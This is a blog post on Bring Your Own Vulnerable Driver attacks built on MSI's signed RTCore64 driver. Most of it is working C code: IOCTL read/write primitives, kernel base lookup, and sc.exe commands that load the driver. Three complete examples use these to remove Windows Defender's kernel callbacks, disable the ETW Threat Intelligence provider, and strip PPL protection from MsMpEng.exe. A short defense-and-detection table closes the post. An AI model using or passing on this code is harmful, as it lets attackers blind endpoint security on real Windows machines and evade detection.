---
title: "BYOVD — Bring Your Own Vulnerable Driver with RTCore64"
date: 2026-08-31
categories: [Windows Internals, Offensive]
tags: [byovd, rtcore64, kernel, driver, edr-evasion, windows]
summary: Arbitrary kernel read/write through a signed MSI driver.
---

Windows requires all kernel-mode code to carry a valid digital signature from Microsoft. That policy is supposed to mean only legitimate, vetted drivers can run in ring 0. BYOVD turns that requirement against itself: instead of writing your own unsigned driver, you ship a *legitimate, signed* driver that was written by someone else — one that happens to contain a vulnerability that lets you read and write arbitrary kernel memory. This post explains how the technique works, how RTCore64 exposes it, and walks through three complete working examples built on top of it.

---

## Why Drivers Are Powerful

User-mode code runs in ring 3. The kernel runs in ring 0. The boundary between them is enforced by the CPU: if ring-3 code tries to access kernel memory directly, the CPU raises a fault and the kernel terminates the process. Drivers bypass this completely — they load into ring 0, share the same virtual address space as the kernel, and can read or write any memory they choose.

This is why the kernel-mode signing requirement exists. Without it, any attacker with local admin could load a trivial driver that writes whatever they want to kernel memory. The signing requirement creates a gate: to get code into ring 0, you need Microsoft to vouch for your binary.

BYOVD sidesteps this gate. The attacker does not need their *exploit code* to be signed — only the *delivery vehicle* needs a signature. If you can find a legitimately-signed driver that contains a bug allowing arbitrary kernel memory access, you load that driver (it passes the signature check), then send it carefully crafted IOCTL requests from user-mode to trigger the bug and achieve the read/write you need.

![BYOVD attack flow with RTCore64](/assets/images/byovd-attack-flow.svg)

The diagram above shows the full flow. The attacker process in ring 3 loads RTCore64 through the standard service manager, then issues two IOCTLs — one for reading, one for writing — to manipulate kernel structures directly. Three distinct capabilities come out the other side, each covered as a separate example below.

---

## RTCore64

RTCore64 is the kernel driver shipped with MSI Afterburner, a GPU overclocking and monitoring utility used by millions. The driver exists to let Afterburner read hardware registers — GPU temperature, fan speed, clock rates — directly without going through standard Windows driver interfaces.

The vulnerability is in how the driver processes two IOCTLs:

| IOCTL code | Operation |
|---|---|
| `0x80002048` | Read N bytes from any kernel virtual address |
| `0x8000204C` | Write N bytes to any kernel virtual address |

There is **no authentication, no capability check, and no address validation**. Any process on the system with a handle to the device can send these IOCTLs and read or write any kernel address it chooses. The driver does not check whether the caller is privileged, whether the address is valid, or whether the size is sane.

The affected version ships with a legitimate Authenticode signature from MSI. Windows loads it without complaint.

---

## The Device and the IOCTL Structure

The driver registers a device object accessible as `\\.\RTCore64`. To use it, open the device with `CreateFileA`, then issue IOCTLs with `DeviceIoControl`.

Both IOCTLs share the same input/output buffer structure. The driver reads fixed byte offsets, so the layout must be exact — any deviation causes it to read garbage. The `#pragma pack(push, 1)` directive is essential: without it, the compiler adds alignment padding that shifts the offsets the driver expects.

![RTCORE_MEM structure layout](/assets/images/byovd-rtcore-struct.svg)

```c
#pragma pack(push, 1)
typedef struct {
    BYTE    pad0[8];     /* +0x00  ignored — zero with {0}             */
    DWORD64 Address;     /* +0x08  kernel virtual address to r/w       */
    BYTE    pad1[8];     /* +0x10  ignored                             */
    DWORD   Size;        /* +0x18  bytes to access: 1, 2, or 4         */
    DWORD   Value;       /* +0x1C  write: data in  |  read: data out   */
    BYTE    pad2[16];    /* +0x20  ignored                             */
} RTCORE_MEM;            /* total: 48 bytes                            */
#pragma pack(pop)
```

Opening the device:

```c
#define DEVICE_NAME  "\\\\.\\RTCore64"
#define IOCTL_READ   0x80002048
#define IOCTL_WRITE  0x8000204C

HANDLE g_dev = CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE,
                            0, NULL, OPEN_EXISTING, 0, NULL);
if (g_dev == INVALID_HANDLE_VALUE) {
    printf("[-] RTCore64 open failed — is the driver loaded? (%lu)\n",
           GetLastError());
    return 1;
}
```

---

## Building Kernel Read/Write Primitives

With the device handle open, build four clean helper functions. Everything else in this post is built on top of these.

### Read 4 Bytes

```c
DWORD kread32(DWORD64 addr) {
    RTCORE_MEM m = {0};
    DWORD returned = 0;
    m.Address = addr;
    m.Size    = 4;
    DeviceIoControl(g_dev, IOCTL_READ, &m, sizeof m, &m, sizeof m, &returned, NULL);
    return m.Value;
}
```

Pass `&m` as **both** the input buffer and the output buffer. The driver fills `m.Value` with the data it read from the kernel address.

### Read 8 Bytes

RTCore64 supports a maximum of 4-byte reads. Reading a 64-bit pointer requires two calls — low 4 bytes first, then high 4 bytes:

```c
DWORD64 kread64(DWORD64 addr) {
    return ((DWORD64)kread32(addr + 4) << 32) | kread32(addr);
}
```

### Write 4 Bytes

```c
void kwrite32(DWORD64 addr, DWORD value) {
    RTCORE_MEM m = {0};
    DWORD returned = 0;
    m.Address = addr;
    m.Size    = 4;
    m.Value   = value;
    DeviceIoControl(g_dev, IOCTL_WRITE, &m, sizeof m, &m, sizeof m, &returned, NULL);
}
```

### Write 8 Bytes

Two `kwrite32` calls, low half first:

```c
void kwrite64(DWORD64 addr, DWORD64 value) {
    kwrite32(addr,     (DWORD)(value & 0xFFFFFFFF));
    kwrite32(addr + 4, (DWORD)(value >> 32));
}
```

### Write 1 Byte — Read-Modify-Write

RTCore64 requires 4-byte aligned write addresses. To patch a single byte at an unaligned address, read the containing DWORD, patch the target byte inside it, then write the DWORD back:

```c
void kwrite8(DWORD64 addr, BYTE value) {
    DWORD64 aligned = addr & ~(DWORD64)3;     /* round down to 4-byte boundary */
    int     shift   = (int)(addr & 3) * 8;    /* bit offset of target byte     */
    DWORD   dw      = kread32(aligned);
    dw = (dw & ~(0xFFUL << shift)) | ((DWORD)value << shift);
    kwrite32(aligned, dw);
}
```

---

## Finding the Kernel Base

Every RVA-based symbol address requires knowing where `ntoskrnl.exe` loaded — the kernel base. This is available to any process through `NtQuerySystemInformation` with class `11` (`SystemModuleInformation`):

![Kernel base resolution](/assets/images/byovd-kbase-resolution.svg)

```c
typedef struct {
    HANDLE  Section;
    PVOID   MappedBase;
    PVOID   ImageBase;    /* ← kbase for modules[0] */
    ULONG   ImageSize;
    ULONG   Flags;
    USHORT  LoadOrderIndex;
    USHORT  InitOrderIndex;
    USHORT  LoadCount;
    USHORT  OffsetToFileName;
    CHAR    FullPathName[256];
} MOD_ENTRY;

DWORD64 GetKernelBase(void) {
    typedef NTSTATUS(NTAPI *NtQSI_t)(ULONG, PVOID, ULONG, PULONG);
    NtQSI_t NtQSI = (NtQSI_t)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    ULONG needed = 0;
    NtQSI(11, NULL, 0, &needed);
    needed += 0x1000;
    BYTE *buf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, needed);
    if (!buf || NtQSI(11, buf, needed, NULL) < 0) return 0;
    /* buf[0..3] = module count; modules start at buf+4 */
    MOD_ENTRY *first = (MOD_ENTRY *)(buf + 4);
    DWORD64 kbase = (DWORD64)first->ImageBase;
    HeapFree(GetProcessHeap(), 0, buf);
    return kbase;
}
```

`modules[0]` is always `ntoskrnl.exe`. Its `ImageBase` is the kernel load address.

Always verify the result by reading the MZ header at that address through RTCore64:

```c
DWORD64 kbase = GetKernelBase();
if ((kread32(kbase) & 0xFFFF) != 0x5A4D) {
    printf("[-] kbase sanity check failed\n");
    return 1;
}
printf("[+] Kernel base: 0x%016llX\n", kbase);
```

If this passes, RTCore64 is live and reading kernel memory correctly. From here on, every symbol is accessed as `kbase + RVA`.

---

## Loading the Driver

To use RTCore64, the driver must first be loaded. With a copy of `RTCore64.sys`:

```cmd
sc.exe create RTCore64 type= kernel start= demand binPath= "C:\path\to\RTCore64.sys"
sc.exe start  RTCore64
```

`sc.exe start` requires `SeLoadDriverPrivilege`, which by default is held by local Administrators. This means BYOVD with RTCore64 requires admin rights — but the goal is not privilege escalation. The goal is to perform operations that **admin rights alone cannot enable**: stripping PPL protection, removing kernel callbacks, and disabling the ETW threat intelligence provider are all actions that no user-mode API exposes, regardless of privilege level.

Clean up after use:

```cmd
sc.exe stop   RTCore64
sc.exe delete RTCore64
```

---

## Example 1 — Removing Kernel Callbacks

Kernel notify callbacks let drivers like WdFilter observe every process creation, DLL load, and handle operation system-wide. Each of the three callback storage mechanisms requires a different removal approach.

### Psp*NotifyRoutine Arrays

Three arrays — `PspProcessNotifyRoutine`, `PspThreadNotifyRoutine`, `PspImageLoadNotifyRoutine` — each hold up to 64 slots. Each non-zero slot is an `EX_FAST_REF`: the low 4 bits are a reference count, the remaining bits point to an `_EX_CALLBACK_ROUTINE_BLOCK`. The actual callback function lives at `+0x08` inside that block.

To remove a callback, zero the entire 8-byte slot:

```c
#define RVA_PROCESS_CALLBACKS   0x503E20ULL  /* Win10 18363 */
#define RVA_THREAD_CALLBACKS    0x503A20ULL
#define RVA_IMAGELOAD_CALLBACKS 0x503C20ULL

DWORD64 arr = kbase + RVA_PROCESS_CALLBACKS;

for (int i = 0; i < 64; i++) {
    DWORD64 slotAddr = arr + (DWORD64)i * 8;
    DWORD64 slot     = kread64(slotAddr);
    if (!slot) continue;

    DWORD64 block = slot & ~(DWORD64)0xF;   /* strip EX_FAST_REF tag bits  */
    DWORD64 fn    = kread64(block + 0x08);  /* callback function pointer   */

    if (IsFromDriver(fn, "WdFilter")) {
        kwrite32(slotAddr,     0);   /* zero both halves of the 8-byte slot */
        kwrite32(slotAddr + 4, 0);
        printf("[+] Removed Process callback slot [%d]\n", i);
    }
}
```

`IsFromDriver` walks the module list from `NtQuerySystemInformation` to check which loaded driver contains the address `fn`.

### ObRegisterCallbacks

`ObTypeIndexTable[7]` is the Process `_OBJECT_TYPE`. Its `CallbackList` at `+0xC8` is the head of a doubly-linked list of `_CALLBACK_ENTRY_ITEM` nodes.

Rather than unlinking the node (which risks a race with the kernel walking the same list), writing `0` to the `Active` field at `+0x014` silently disables the callback while leaving the list structure intact:

```c
#define RVA_OB_TYPE_INDEX_TABLE  0x572D80ULL
#define OB_CALLBACKLIST_OFF      0x0C8
#define CEI_ACTIVE_OFF           0x014
#define CEI_PREOPERATION_OFF     0x028

DWORD64 objType  = kread64(kbase + RVA_OB_TYPE_INDEX_TABLE + 7 * 8);
DWORD64 listHead = objType + OB_CALLBACKLIST_OFF;
DWORD64 node     = kread64(listHead);   /* first Flink */

while (node && node != listHead) {
    DWORD64 preOp = kread64(node + CEI_PREOPERATION_OFF);
    if (IsFromDriver(preOp, "WdFilter")) {
        kwrite32(node + CEI_ACTIVE_OFF, 0);
        printf("[+] Disabled ObCallback node 0x%016llX\n", node);
    }
    node = kread64(node);   /* follow Flink to next node */
}
```

Repeat with `ObTypeIndexTable[8]` for Thread handle callbacks.

### Registry Callbacks (CmRegisterCallbackEx)

The registry callback list is a standard doubly-linked list rooted at `CmCallbackListHead`. Each node has its callback function at `+0x028`. Remove a node with a standard LIST_ENTRY unlink — two pointer writes that bypass the target:

```c
#define RVA_CALLBACK_LIST_HEAD  0x463980ULL
#define CMREG_FUNCTION_OFF      0x028

DWORD64 listHead = kbase + RVA_CALLBACK_LIST_HEAD;
DWORD64 prev     = listHead;
DWORD64 node     = kread64(listHead);

while (node && node != listHead) {
    DWORD64 next = kread64(node);           /* node.Flink     */
    DWORD64 fn   = kread64(node + CMREG_FUNCTION_OFF);

    if (IsFromDriver(fn, "WdFilter")) {
        kwrite64(prev,     next);           /* prev.Flink = next */
        kwrite64(next + 8, prev);           /* next.Blink = prev */
        printf("[+] Unlinked Cm callback 0x%016llX\n", node);
        /* do NOT advance prev — it already points to next's predecessor */
    } else {
        prev = node;
    }
    node = next;
}
```

After these three operations, WdFilter's callbacks are gone across all five types. Process creations, DLL loads, handle operations, and registry operations are no longer reported to it.

---

## Example 2 — Disabling ETW Threat Intelligence

The ETW Threat Intelligence provider (`{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}`) is the kernel's security telemetry channel. When enabled, the kernel delivers events for suspicious kernel-mode operations to any process running a TI consumer session. Disabling it blinds all consumers at once.

**Navigating to the TI provider entry:**

The path through kernel structures:

```
kbase + RVA_ETW_DEBUGGER_DATA           → EtwpDebuggerData
EtwpDebuggerData + 0x18                 → pointer to _ETW_SILODRIVERSTATE
silo + 0x1D0 + (29 * 0x38)             → bucket 29 in EtwpGuidHashTable
walk bucket list, match GUID.Data1 == 0xF4E1897C → _ETW_GUID_ENTRY
```

The TI provider's GUID always hashes to bucket 29. Walk the bucket list comparing the first DWORD of the GUID at `+0x028`:

```c
#define RVA_ETW_DEBUGGER_DATA  0x429E08ULL  /* Win10 18363 */
#define TI_GUID_DATA1          0xF4E1897CUL

DWORD64 silo       = kread64(kbase + RVA_ETW_DEBUGGER_DATA + 0x18);
DWORD64 bucketHead = silo + 0x1D0 + 29 * 0x38;
DWORD64 node       = kread64(bucketHead);
DWORD64 tiEntry    = 0;

int guard = 0;
while (node && node != bucketHead && guard++ < 64) {
    if (kread32(node + 0x028) == TI_GUID_DATA1) {
        tiEntry = node;
        break;
    }
    node = kread64(node);   /* follow Flink */
}

if (!tiEntry) { printf("[-] TI provider not found\n"); return 1; }
printf("[+] TI entry: 0x%016llX\n", tiEntry);
```

**Zeroing the enable flags:**

The `_ETW_GUID_ENTRY` has a `ProviderEnableInfo` at `+0x060` and 8 per-session `EnableInfo` slots at `+0x080`. Zero the `IsEnabled` DWORD in each:

```c
/* Disable ProviderEnableInfo */
kwrite32(tiEntry + 0x060, 0);

/* Disable all 8 per-session EnableInfo slots (0x20 bytes each) */
for (int s = 0; s < 8; s++)
    kwrite32(tiEntry + 0x080 + (DWORD64)s * 0x20, 0);

printf("[+] ETW-TI disabled\n");
```

After this, the kernel treats the TI provider as inactive and drops all events. Any process running a TI consumer session — such as Windows Defender's cloud protection component — receives nothing.

---

## Example 3 — Stripping PPL

Protected Process Light (PPL) is stored as a single byte at `EPROCESS + 0x6FA` (Win10 build 18363). Writing `0` to it removes the protection. No API can do this — the kernel enforces PPL before any access check runs.

**Step 1: Find the System process EPROCESS**

`PsInitialSystemProcess` is a global pointer in ntoskrnl pointing to the System process's `_EPROCESS` — the head of the active process list.

```c
#define RVA_PS_INITIAL_SYSTEM  0x5723A0ULL  /* Win10 18363 x64 */
#define EPROC_LINKS_OFF        0x2F0
#define EPROC_NAME_OFF         0x450
#define EPROC_PROT_OFF         0x6FA

DWORD64 sysEp = kread64(kbase + RVA_PS_INITIAL_SYSTEM);
```

**Step 2: Walk PsActiveProcessLinks**

Every `_EPROCESS` contains a `LIST_ENTRY` at `+0x2F0` linking it into a circular list of all processes. Follow `Flink`, subtract the list offset to recover the `_EPROCESS` base, and check each process until you find the target:

```c
DWORD64 ep    = sysEp;
int     guard = 0;

do {
    char    name[16] = {0};
    BYTE    prot;

    /* Read the 15-char ImageFileName in 4-byte chunks */
    for (int i = 0; i < 16; i += 4) {
        DWORD d = kread32(ep + EPROC_NAME_OFF + i);
        memcpy(name + i, &d, 4);
    }
    name[15] = '\0';

    /* EPROC_PROT_OFF (0x6FA) is not 4-byte aligned, so read the
       containing DWORD and extract the byte we need */
    DWORD64 aligned = (ep + EPROC_PROT_OFF) & ~(DWORD64)3;
    int     shift   = (int)((ep + EPROC_PROT_OFF) & 3) * 8;
    prot = (BYTE)(kread32(aligned) >> shift);

    if (_stricmp(name, "MsMpEng.exe") == 0 && prot) {
        kwrite8(ep + EPROC_PROT_OFF, 0);
        printf("[+] Stripped PPL from %s (was 0x%02X)\n", name, prot);
    }

    DWORD64 flink = kread64(ep + EPROC_LINKS_OFF);
    ep = flink - EPROC_LINKS_OFF;   /* step back from LIST_ENTRY to EPROCESS */

} while (ep != sysEp && ++guard < 512);
```

After this runs, `OpenProcess(PROCESS_ALL_ACCESS, ...)` on MsMpEng succeeds. The PPL gate is gone.

**Why `kwrite8` instead of `kwrite32`?** The Protection byte is at `+0x6FA`, which is not 4-byte aligned. The `kwrite8` function does a read-modify-write on the containing DWORD so that the adjacent bytes — which hold unrelated `_EPROCESS` fields — are left intact.

---

## RVAs Are Build-Specific

Every RVA used above (`0x5723A0`, `0x503E20`, `0x429E08`, etc.) is correct for **Windows 10 build 18363 x64**. These values change with every cumulative update and are different on Windows 11.

---

## Defense and Detection

| Layer | What it stops |
|---|---|
| **HVCI (Hypervisor-Protected Code Integrity)** | Enforces the vulnerable driver blocklist at hypervisor level — RTCore64 cannot load |
| **WDAC with driver block rules** | Microsoft's `DriverSiPolicy.p7b` deny-lists RTCore64 by hash — import into WDAC policy |
| **Event ID 7045** | Windows logs every `sc.exe create` for a kernel driver — monitor for unexpected kernel-mode services |
| **Load callback (PsSetLoadImageNotifyRoutine)** | EDR can deny-list drivers by hash or subject name at load time |
| **Process handle anomalies** | Alert on PROCESS_ALL_ACCESS to protected processes (MsMpEng, lsass) immediately after a new driver loads |

The most robust defense is **HVCI**. When Hypervisor-Protected Code Integrity is enabled, the hypervisor enforces driver signing and the vulnerable driver blocklist before Windows kernel code can execute it — no user-mode or kernel-mode bypass applies. RTCore64 was added to Microsoft's recommended driver block rules in 2022 and is blocked by default on systems with HVCI.
